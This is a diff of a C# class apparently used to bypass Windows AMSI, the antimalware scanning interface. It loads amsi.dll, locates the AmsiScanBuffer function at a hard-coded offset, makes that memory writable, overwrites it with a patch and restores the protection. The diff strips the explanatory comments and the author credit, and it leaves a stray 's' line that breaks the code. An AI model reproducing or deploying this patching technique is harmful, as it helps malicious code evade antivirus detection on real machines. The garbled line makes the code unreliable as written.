@@ -1,6 +1,6 @@
 using System;
 using System.Runtime.InteropServices;
-// Andres Doreste, ASB Bypass mod without using GetProcAddress
+s
 
 public class Amsi
 {
@@ -9,17 +9,12 @@ public class Amsi
     {
         try
         {   
-            // Returns amsi.dll address
             var lib = Win32.LoadLibrary("amsi.dll");
-            // Locate ASB Function by amsi.dll address + 0x2540 (9536)
             IntPtr ASBPtr = new IntPtr(lib.ToInt64() + 9536);
-            // Change memory protection to PAGE_READWRITE
             uint oldProtect;
             Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x04, out oldProtect);
-            // Apply the patch
             Marshal.Copy(patch, 0, ASBPtr, patch.Length);
-            // Change memory protection to PAGE_EXECUTE_READ
-            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x20, out oldProtect);
+            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x20, out oldProtect);  
         }
         catch (Exception e)
         {
